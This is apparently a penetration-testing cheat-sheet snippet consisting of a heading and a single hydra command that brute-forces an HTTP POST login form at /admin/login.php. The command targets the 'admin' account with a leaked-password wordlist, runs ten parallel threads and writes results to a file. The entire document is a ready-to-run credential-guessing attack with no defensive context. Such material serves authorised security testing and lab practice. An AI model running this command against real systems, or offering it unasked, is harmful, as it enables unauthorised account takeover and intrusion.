# hydra brute force HTTP post form
```bash
hydra $IP http-post-form "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect" \
-l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt -t 10 -w 30 -o hydra-http-post-attack.txt
```
